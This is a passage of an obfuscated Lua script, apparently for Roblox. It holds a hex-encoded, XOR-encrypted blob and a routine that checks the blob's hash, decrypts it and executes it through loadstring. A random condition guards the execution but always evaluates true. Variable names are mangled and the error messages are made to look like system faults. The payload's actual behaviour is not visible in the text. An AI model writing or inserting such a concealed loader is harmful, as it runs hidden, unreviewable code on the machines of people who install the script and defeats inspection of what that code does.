    "b2b081859197a8b2b2baf6b8818c87d992afa8ad99ba94c9c08baeafacaee4f0cf938394f4bcb5a9b6aa82949186a8b8b3b3aaba8e95cc80b5b6f3abbbb19599dad0b2f49f849c9ab2cca4b19fa399879bf092848490f5b3b9bcbaaccf8c838ab4f49fa4bcba92c4d0d39ca9b9b8a4bac2c8cbcbf3",
    ""
}
local _0x140b3 = 218
local _0x0734b = 10
local _0x234ec = "36d5fb5b"

local _0x2c5b4 = function(s)
    local h = 0
    for i = 1, #s do
        h = (31 * h + s:byte(i)) % 4294967296
    end
    return string.format("%x", math.abs(h))
end

local _0x062e6 = function(ls, k, s)
    local raw = table.concat(ls)
    if _0x2c5b4(raw) ~= _0x234ec then 
        return "warn('[SEMI-V2.5] INTEGRITY_FAULT_DETECTED')" 
    end
    local full = ""
    for li, lv in ipairs(ls) do
        local line_res = ""
        local _l_idx = li - 1
        for i = 1, #lv, 2 do
            local b = tonumber(lv:sub(i, i+1), 16)
            local dk = (k + ((_l_idx + (i//2)) % s)) % 256
            line_res = line_res .. string.char(bit32.bxor(b, dk))
        end
        full = full .. line_res .. "\n"
    end
    return full
end

local _0x_p = (function(a,b) return (a*b) < (a+b)*100 end)(math.random(1,5), math.random(1,5))
if _0x_p then
    local _0x7e584 = _0x062e6(_0x0d16b, _0x140b3, _0x0734b)
    local _s, _e = pcall(function() return loadstring(_0x7e584)() end)
    if not _s then warn("[SEMI-V2.5] KERNEL_PANIC: " .. tostring(_e)) end
end
